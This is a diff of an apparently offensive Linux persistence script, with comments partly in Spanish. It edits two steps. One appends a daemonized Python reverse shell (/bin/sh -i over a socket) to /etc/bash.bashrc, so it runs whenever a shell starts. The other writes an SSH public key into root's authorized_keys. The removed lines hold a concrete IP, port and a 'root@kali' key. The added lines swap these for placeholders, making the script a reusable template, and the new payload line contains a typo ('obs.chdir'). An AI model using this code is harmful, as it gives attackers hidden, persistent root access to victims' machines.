@@ -104,7 +104,7 @@ sudo service cron restart
 
 cat <<EOF >> /etc/bash.bashrc
 
-python3 -c 'exec ("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("192.168.1.105",9999))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'
+python3 -c 'exec ("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nobs.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("<YOUR IP HERE>",<PORT>))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'
 
 EOF
 
@@ -141,7 +141,7 @@ then
 sudo mkdir /root/.ssh
 touch /root/.ssh/authorized_keys
 fi 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjfFwzp1pDcpXaM7vzDQ7OoCYslPx/2/L5xR76BSb5vi2vbCAG5N66Vhyc0GaavDCDW81R28UUnxTVR10I/vtVEa5T/5vUTJbUDONxcr6DWe1HIuLCLUjB9U2n97AWMe4G2+f+o2drsrTm6i399vF2U9aQ0rBQnL9d8EIbOJZBRa6VWVbEQHTJ4WtHHF0ZLcx0+n9D4ArE7goEVEExLaGVRdMkyafNxX4Gi4toMTWS0JyaX2esa/UD96Z1GiQpsboGb2Xnf2bhnnnPKamS3IPRCX1+84gXY3Q0FgK9tsL2s2MMcL6JAnVkFdulvySGjwXuB3dOnaRk/fHSLFsK919Ctn+OQL3rqcf2w3VSVATpjy/clSQgeVt/lDKmf5fBjomAIGz1caAL4gH12oePEwFTXKVCNG0a7hw63GO3cNNgR+GImjsrNRIhxPUDgfkEcFHtkJzRea5M0L35GhF1Vu9OL2cwkb2oa59JzAK/B21C4FFbBqrkkFmqiGATfvXer/E= root@kali" >> /root/.ssh/authorized_keys
+echo "YOUR PUBLIC SSH KEY HERE" >> /root/.ssh/authorized_keys
 fi 
 
 #7///////////////LIMPIEZA/////////////////
